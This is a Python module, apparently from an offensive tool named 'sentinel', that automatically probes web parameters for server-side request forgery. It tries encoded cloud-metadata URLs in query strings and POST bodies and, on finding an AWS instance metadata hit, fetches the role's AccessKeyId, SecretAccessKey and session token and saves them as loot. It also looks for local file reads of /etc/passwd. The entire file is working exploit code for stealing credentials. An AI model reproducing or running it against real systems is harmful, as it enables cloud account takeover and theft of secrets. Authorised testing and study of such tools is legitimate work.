"""SSRF module — find SSRF parameters and exploit them to extract cloud credentials."""

from __future__ import annotations

import json
import urllib.parse

from sentinel.data import SSRF_BYPASS_ENCODINGS, SSRF_PROBES
from sentinel.logger import log
from sentinel.models import HAS_REQUESTS, AttackResult, Credential, EngagementSession, SSRFHit
from sentinel.modules.base import BaseModule
from sentinel.utils.http import request


class SSRFModule(BaseModule):
    """Find SSRF parameters and exploit them to extract cloud credentials."""

    name = "ssrf"

    def run(self, es: EngagementSession, **kwargs: object) -> list[AttackResult]:
        param_names: list[str] | None = kwargs.get("param_names")  # type: ignore[assignment]
        target_url: str = kwargs.get("target_url", "")  # type: ignore[assignment]

        results: list[AttackResult] = []
        if not HAS_REQUESTS:
            return results

        scan_url = target_url or es.base_url
        probe_params = param_names or [
            "url", "uri", "src", "source", "redirect", "target", "dest",
            "destination", "next", "callback", "return", "returnUrl", "returnURL",
            "redirect_uri", "redirect_url", "ref", "referrer", "site",
            "endpoint", "fetch", "path", "host", "domain", "resource",
            "link", "image", "img", "logo", "icon", "file", "page",
            "data", "proxy", "forward", "api", "webhook", "notify",
        ]

        hits: list[SSRFHit] = []

        # Test each param with each cloud metadata probe
        for param in probe_params:
            for cloud_name, probes in SSRF_PROBES.items():
                for probe in probes:
                    ssrf_url = probe["url"]
                    extra_hdrs = probe.get("headers", {})
                    method = probe.get("method", "GET")

                    # Try direct injection first
                    for encoding_fn in SSRF_BYPASS_ENCODINGS[:3]:  # limit bypass attempts
                        encoded_url = encoding_fn(ssrf_url)
                        test_params = {param: encoded_url}
                        resp = request(es, method, scan_url, params=test_params,
                                       headers={**dict(es.headers), **extra_hdrs})
                        if resp is None:
                            continue

                        body = resp.text[:2000]
                        indicators = probe.get("indicator", [])

                        # Check response for SSRF evidence
                        is_hit = False
                        if indicators and any(ind.lower() in body.lower() for ind in indicators) or "access_key" in body.lower() or "secretaccesskey" in body.lower() or "access_token" in body.lower() and cloud_name in ("azure_imds", "gcp_metadata") or "root:x:0" in body and "file:///" in ssrf_url:
                            is_hit = True

                        if is_hit:
                            hit = SSRFHit(
                                url=scan_url, ssrf_param=param, ssrf_url=encoded_url,
                                response=body, cloud=cloud_name, critical=probe.get("critical", False),
                            )
                            hits.append(hit)
                            sev = "CRITICAL" if probe.get("critical") else "HIGH"
                            log(f"[SSRF] HIT! param={param} url={ssrf_url[:60]} cloud={cloud_name}", "CRIT")

                            # If we hit IMDS, try to extract credentials immediately
                            if cloud_name == "aws_imds_v1" and "security-credentials" in ssrf_url:
                                creds = self._extract_aws_creds(es, scan_url, param, body)
                                if creds:
                                    es.credentials.extend(creds)

                            results.append(AttackResult(
                                "ssrf", f"hit_{cloud_name}",
                                "VULN", url=scan_url, payload=f"{param}={encoded_url}",
                                evidence=body[:300], data={"cloud": cloud_name, "param": param,
                                                           "ssrf_url": encoded_url},
                                severity=sev,
                                notes=f"SSRF via param '{param}' targeting {cloud_name}"
                            ))
                            break  # Stop trying bypass encodings for this probe

        # POST body SSRF testing
        for param in probe_params[:10]:
            for probes in SSRF_PROBES.values():
                probe = probes[0]
                ssrf_url = probe["url"]
                for content_type, payload_fn in [
                    ("application/json",                    lambda p, u: json.dumps({p: u})),
                    ("application/x-www-form-urlencoded",   lambda p, u: f"{p}={urllib.parse.quote(u)}"),
                    ("text/xml",                            lambda p, u: f"<request><{p}>{u}</{p}></request>"),
                ]:
                    resp = request(es, "POST", scan_url,
                                   data=payload_fn(param, ssrf_url),
                                   headers={**dict(es.headers), "Content-Type": content_type})
                    if resp and resp.text and any(
                        ind.lower() in resp.text.lower() for ind in probe.get("indicator", [])
                    ):
                        log(f"[SSRF] POST SSRF hit! param={param} ct={content_type}", "CRIT")
                        results.append(AttackResult(
                            "ssrf", "post_ssrf", "VULN",
                            url=scan_url,
                            payload=f"POST {param}={ssrf_url} ({content_type})",
                            evidence=resp.text[:300],
                            severity="CRITICAL",
                            notes=f"POST-body SSRF via {param} with {content_type}",
                        ))

        if not hits and not results:
            results.append(AttackResult("ssrf", "scan", "NOT_VULN",
                                        url=scan_url,
                                        notes=f"Tested {len(probe_params)} params x {sum(len(v) for v in SSRF_PROBES.values())} probes — no SSRF found"))
        es.loot["ssrf"] = [{"param": h.ssrf_param, "url": h.ssrf_url, "cloud": h.cloud} for h in hits]
        return results

    def _extract_aws_creds(self, es: EngagementSession, scan_url: str,
                            param: str, role_list_body: str) -> list[Credential]:
        creds = []
        role_name = role_list_body.strip().split("\n")[0].strip()
        if not role_name:
            return creds
        cred_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
        resp = request(es, "GET", scan_url, params={param: cred_url})
        if resp:
            try:
                data = resp.json()
                if "AccessKeyId" in data:
                    creds.append(Credential(
                        type="aws_instance_role",
                        value={"AccessKeyId": data["AccessKeyId"],
                               "SecretAccessKey": data.get("SecretAccessKey", ""),
                               "Token": data.get("Token", ""),
                               "Expiration": data.get("Expiration", "")},
                        source=f"SSRF:IMDS:{param}",
                        notes=f"EC2 role credentials via SSRF param '{param}'",
                    ))
                    log(f"[SSRF] AWS creds extracted! KeyId={data['AccessKeyId'][:16]}...", "CRIT")
            except Exception:
                pass
        return creds
